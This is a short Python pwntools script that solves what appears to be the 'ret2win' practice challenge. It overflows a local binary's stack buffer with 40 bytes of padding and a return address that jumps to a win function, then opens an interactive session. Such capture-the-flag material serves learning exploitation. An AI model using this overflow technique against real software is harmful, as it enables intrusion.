from pwn import *

p = process("./ret2win")

ret2win = 0x00400811

payload = ''
payload += "A"*40
payload += p64(ret2win)

p.sendline(payload)
p.interactive()
